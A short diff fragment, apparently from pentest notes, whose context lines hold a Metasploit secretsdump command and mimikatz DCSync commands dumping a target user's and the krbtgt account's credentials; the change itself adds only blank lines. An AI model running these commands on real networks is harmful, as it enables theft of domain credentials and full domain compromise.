@@ -195,4 +195,6 @@ ole -x "use auxiliary/scanner/smb/impacket/secretsdump; set RHOSTS 192.168.1.48;
 privilege::debug
 lsadump::dcsync /user:<target_user>
 lsadump::dcsync /domain:ignite.local /user:krbtgt
+
+
 ```
